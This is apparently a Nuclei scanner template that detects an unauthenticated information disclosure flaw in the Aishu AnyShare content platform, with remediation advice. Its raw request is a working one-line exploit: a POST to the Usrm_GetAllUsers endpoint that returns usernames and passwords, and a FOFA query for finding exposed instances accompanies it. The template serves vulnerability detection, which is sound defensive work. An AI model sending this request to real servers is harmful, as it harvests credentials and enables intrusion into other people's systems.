http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "directDeptInfo\":", "loginName\":", "password\":", "createTime\":")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1

    Host: {{Hostname}}


    [1,100]

    '
id: aishu-anyshare-info-exposure
info:
  author: s4e-io
  description: 'Aishu AnyShare intelligent content management platform Usrm_GetAllUsers
    interface has an information disclosure vulnerability, and unauthenticated attackers
    can obtain sensitive information such as usernames and passwords. You can log
    in to the background and put the system in a highly insecure state.

    '
  metadata:
    fofa-query: app="AISHU-AnyShare"
    max-request: 1
    product: anyshare
    vendor: aishu
    verified: true
  name: Aishu AnyShare - Information Disclosure
  reference:
  - https://cn-sec.com/archives/3431184.html
  remediation: 'Ensure that the endpoint is protected and only accessible by authenticated
    and authorized users. Implement proper access controls and validate user permissions.

    '
  severity: high
  tags: aishu-anyshare,info-leak,disclosure
